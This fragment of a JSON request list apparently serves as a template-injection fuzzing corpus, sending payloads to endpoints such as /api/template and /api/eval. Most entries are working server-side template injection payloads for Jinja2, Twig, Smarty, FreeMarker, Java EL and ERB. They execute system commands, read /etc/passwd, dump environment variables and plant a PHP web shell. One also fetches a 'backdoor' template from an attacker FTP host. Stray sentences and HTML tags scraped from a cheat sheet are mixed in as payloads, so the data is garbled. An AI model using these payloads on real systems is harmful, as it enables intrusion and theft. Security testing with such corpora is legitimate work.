+      "query": "fopen(join(\"\", [\"Y:/A:/\", shell_exec('id')]), \"r\")"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "shell_exec('id')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "shell_exec('id')"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "Boolean-Based RCE payload:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "Boolean-Based RCE payload:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "java\n${T(java.lang.System).getenv()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "java\n${T(java.lang.System).getenv()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "array(\"first_name\" => $user.first_name)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "array(\"first_name\" => $user.first_name)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "python\n{{ lipsum.__globals__[\"os\"].popen('id').read() }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "python\n{{ lipsum.__globals__[\"os\"].popen('id').read() }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "global.process.mainModule.require(\"Y:/A:/\"+global.process.mainModule.require(\"child_process\").execSync(\"id\").toString())"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "global.process.mainModule.require(\"Y:/A:/\"+global.process.mainModule.require(\"child_process\").execSync(\"id\").toString())"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "_.template(string, options);"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "_.template(string, options);"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "ruby\n<%= 7 * 7 %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "ruby\n<%= 7 * 7 %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{#with string.split as |codelist|}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{#with string.split as |codelist|}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "POST /subscribe?0=cat+/etc/passwd HTTP/1.1"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "POST /subscribe?0=cat+/etc/passwd HTTP/1.1"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "twig\n{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "twig\n{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{self}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{self}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Jinja2 is used by Python Web Frameworks such as Django or Flask."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Jinja2 is used by Python Web Frameworks such as Django or Flask."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{this.push \"return require('child_process').execSync('ls -la');\"}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{this.push \"return require('child_process').execSync('ls -la');\"}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": ":warning: the number 396 will vary depending of the application."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": ":warning: the number 396 will vary depending of the application."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{system('ls')} // compatible v3, deprecated in v5"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{system('ls')} // compatible v3, deprecated in v5"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "js\n{{this}}\n{{self}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "js\n{{this}}\n{{self}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "${str().join(chr(i)for(i)in[105,100])}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "${str().join(chr(i)for(i)in[105,100])}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "#{...}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "#{...}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "getattr(\"\", \"x\" + __include__(\"os\").popen(\"id\").read()) # Error-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "getattr(\"\", \"x\" + __include__(\"os\").popen(\"id\").read()) # Error-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "python\n{{ '<script>alert(3)</script>' }}\n{{ '<script>alert(3)</script>' | safe }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "python\n{{ '<script>alert(3)</script>' }}\n{{ '<script>alert(3)</script>' | safe }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{ 1 / ([\"id >>/dev/null && echo -n 1\", \"0\"]|sort(\"system\")|first == \"0\") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{ 1 / ([\"id >>/dev/null && echo -n 1\", \"0\"]|sort(\"system\")|first == \"0\") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{% for a in [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% endfor %} // Enable verbose error output for Error-Based"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{% for a in [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% endfor %} // Enable verbose error output for Error-Based"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "You can import Flask functions to return an output from the vulnerable page."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "You can import Flask functions to return an output from the vulnerable page."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<%= IO.popen('ls /').readlines()  %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<%= IO.popen('ls /').readlines()  %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{{#with \"e\"}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{{#with \"e\"}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{#with (string.sub.apply 0 codelist)}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{#with (string.sub.apply 0 codelist)}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "<patTemplate:tmpl name=\"hello\">"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "<patTemplate:tmpl name=\"hello\">"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "${3*3}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "${3*3}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "<?=$this->section('content')?>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "<?=$this->section('content')?>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{= _.VERSION}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{= _.VERSION}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "${((char)105).toString()+((char)100).toString()}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "${((char)105).toString()+((char)100).toString()}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "python\n{{ self.__init__.__globals__.__builtins__ }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "python\n{{ self.__init__.__globals__.__builtins__ }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "${7*7}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "${7*7}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{['cat\\x20/etc/passwd']|filter('system')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{['cat\\x20/etc/passwd']|filter('system')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{ '<script>alert(3)</script>' | safe }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{ '<script>alert(3)</script>' | safe }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{{this.pop}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{{this.pop}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{php}echo `id`;{/php} //deprecated in smarty v3"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{php}echo `id`;{/php} //deprecated in smarty v3"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{ 7*7 }}  # Error with Django Templates"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{ 7*7 }}  # Error with Django Templates"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{['id']|filter('passthru')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{['id']|filter('passthru')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "\"Dear {first_name}\","
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "\"Dear {first_name}\","
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "py\n{{os.system('whoami')}}\n{%import os%}{{os.system('nslookup oastify.com')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "py\n{{os.system('whoami')}}\n{%import os%}{{os.system('nslookup oastify.com')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "[Official website](https://www.makotemplates.org/)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "[Official website](https://www.makotemplates.org/)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "${__import__('os').system('id')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "${__import__('os').system('id')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<tbody>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<tbody>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "- Method using `java.lang.ProcessBuilder`"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "- Method using `java.lang.ProcessBuilder`"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "ruby\n<%= File.open('/etc/passwd').read %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "ruby\n<%= File.open('/etc/passwd').read %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "- x = x.mainModule.require"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "- x = x.mainModule.require"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "python\n<pre>{% debug %}</pre>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "python\n<pre>{% debug %}</pre>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "python\nFILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "python\nFILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "'Bjoern Schotte'     => 'schotte@mayflower.de'"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "'Bjoern Schotte'     => 'schotte@mayflower.de'"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "DNS lookup"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "DNS lookup"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "interpolate: /\\{\\{=(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "interpolate: /\\{\\{=(.+?)\\}\\}/g,"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "You can bypass security filters by constructing strings from ASCII codes and executing them as system commands."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "You can bypass security filters by constructing strings from ASCII codes and executing them as system commands."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<thead>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<thead>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{{dump(_context)}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{dump(_context)}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "javascript\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "javascript\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "ruby\n#{ 7 * 7 }"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "ruby\n#{ 7 * 7 }"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "${1/((freemarker.template.utility.Execute\"?new()(\" … && echo UniqueString\")?chop_linebreak?ends_with(\"UniqueString\"))?string('1','0')?eval)} // Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "${1/((freemarker.template.utility.Execute\"?new()(\" … && echo UniqueString\")?chop_linebreak?ends_with(\"UniqueString\"))?string('1','0')?eval)} // Boolean-Based RCE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "Modify session attributes"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "Modify session attributes"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "twig\n{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "twig\n{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{= _.templateSettings.evaluate }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{= _.templateSettings.evaluate }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "{% csrf_token %} # Causes error with Jinja2"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{% csrf_token %} # Causes error with Jinja2"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "php\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{dump(_context)}}\n{{app.request.server.all|join(',')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "php\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{dump(_context)}}\n{{app.request.server.all|join(',')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<p>Hello, <?=$this->e($name)?></p>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<p>Hello, <?=$this->e($name)?></p>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<%= %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<%= %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "{{''.__class__.__bases__[0].__subclasses__()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "{{''.__class__.__bases__[0].__subclasses__()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "python\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "python\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{['id']|filter('system')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{['id']|filter('system')}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "$authors = array("
+    }
+  },
+  {
